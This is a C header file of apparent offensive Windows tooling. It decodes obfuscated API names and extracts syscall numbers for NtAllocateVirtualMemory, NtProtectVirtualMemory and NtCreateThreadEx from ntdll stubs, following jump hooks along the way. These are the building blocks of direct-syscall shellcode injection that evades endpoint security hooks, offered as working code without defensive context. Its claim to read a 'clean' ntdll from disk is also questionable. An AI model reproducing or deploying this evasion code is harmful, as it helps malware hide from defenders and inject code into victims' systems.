#pragma once
#include "obfstring.h"

DWORD g_NtAllocateVirtualMemorySyscall = 0;
DWORD g_NtProtectVirtualMemorySyscall = 0;
DWORD g_NtCreateThreadExSyscall = 0;


DWORD GetSyscallFromDiskClassic(const char* name) {
    HMODULE cleanNtDll = LoadLibraryExA(
        "ntdll.dll",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (!cleanNtDll)
        return 0;

    BYTE* fn = (BYTE*)GetProcAddress(cleanNtDll, name);
    if (!fn)
        return 0;

    // Expected:
    // 4C 8B D1          mov r10, rcx
    // B8 xx xx xx xx    mov eax, syscall#
    DWORD syscall = *(DWORD*)(fn + 4);

    FreeLibrary(cleanNtDll);
    return syscall;
}

DWORD ExtractSyscallNumber(BYTE* fn) {
    BYTE* p = fn;
    // Follow jump stubs
    for (int depth = 0; depth < 5; depth++) {
        // jmp rel32
        if (p[0] == 0xE9) {
            INT32 rel = *(INT32*)(p + 1);
            p = p + 5 + rel;
            continue;
        }
        // jmp qword ptr [rip+imm32]
        if (p[0] == 0xFF && p[1] == 0x25) {
            INT32 rel = *(INT32*)(p + 2);
            BYTE** target = (BYTE**)(p + 6 + rel);
            p = *target;
            continue;
        }
        break;
    }
    // Now scan for mov eax, imm32
    for (int i = 0; i < 0x40; i++) {
        if (p[i] == 0xB8) {
            return *(DWORD*)(p + i + 1);
        }
    }
    return 0;
}

DWORD GetSyscallFromDisk(const char* name) {
    HMODULE cleanNtDll = LoadLibraryExA(
        "ntdll.dll",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (!cleanNtDll)
        return 0;

    BYTE* fn = (BYTE*)GetProcAddress(cleanNtDll, name);
    if (!fn)
        return 0;

    DWORD syscall = ExtractSyscallNumber(fn);

    FreeLibrary(cleanNtDll);
    return syscall;
}

void InitSyscalls() {
    unsigned char d[32];

    obf_decode(d, s_NtAllocateVirtualMemory, sizeof(s_NtAllocateVirtualMemory));
    g_NtAllocateVirtualMemorySyscall = GetSyscallFromDiskClassic(d);
    printf("%s: %d\n", d, g_NtAllocateVirtualMemorySyscall);
    secure_zero(d, sizeof(d));

    obf_decode(d, s_NtProtectVirtualMemory, sizeof(s_NtProtectVirtualMemory));
    g_NtProtectVirtualMemorySyscall = GetSyscallFromDiskClassic(d);
    printf("%s: %d\n", d, g_NtProtectVirtualMemorySyscall);
    secure_zero(d, sizeof(d));

    obf_decode(d, s_NtCreateThreadEx, sizeof(s_NtCreateThreadEx));
    g_NtCreateThreadExSyscall = GetSyscallFromDiskClassic(d);
    printf("%s: %d\n", d, g_NtCreateThreadExSyscall);
    secure_zero(d, sizeof(d));
}